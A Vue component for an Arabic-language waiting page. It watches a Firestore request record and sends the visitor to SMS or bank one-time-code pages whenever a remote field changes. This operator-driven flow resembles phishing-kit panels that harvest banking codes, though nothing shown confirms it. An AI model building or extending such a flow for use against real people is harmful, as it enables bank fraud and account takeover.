<script setup lang="ts">
import { onMounted, onUnmounted, ref } from 'vue';
import { useRouter } from 'vue-router';
import { doc, onSnapshot } from 'firebase/firestore';
import { db } from '../firebase';

const router = useRouter();
const errorMessage = ref('');

let unsubscribe: (() => void) | null = null;

onMounted(() => {
  const requestId = localStorage.getItem('currentRequestId');
  if (!requestId) {
    router.push('/');
    return;
  }

  const requestRef = doc(db, 'requests', requestId);
  
  unsubscribe = onSnapshot(requestRef, (docSnap) => {
    if (docSnap.exists()) {
      const data = docSnap.data();
      if (data.nextAction === 'otp-sms') {
        router.push('/otp');
      } else if (data.nextAction === 'otp-bank') {
        router.push('/otp-bank');
      }
    } else {
      errorMessage.value = 'الطلب غير موجود.';
    }
  }, (error) => {
    console.error("Error listening to request updates:", error);
  });
});

onUnmounted(() => {
  if (unsubscribe) {
    unsubscribe();
  }
});
</script>

<template>
  <div class="max-w-xl mx-auto bg-white min-h-[100vh] flex flex-col items-center justify-center font-sans">
    <div class="flex flex-col items-center">
      <div class="animate-spin rounded-full h-16 w-16 border-b-4 border-blue-800 mb-6"></div>
      <h2 class="text-xl font-bold text-gray-800 mb-2">يرجى الانتظار</h2>
      <p class="text-gray-500 text-center px-6">يتم معالجة التحديث، الرجاء عدم إغلاق هذه الصفحة...</p>
      
      <div v-if="errorMessage" class="text-red-500 mt-4">{{ errorMessage }}</div>
    </div>
  </div>
</template>
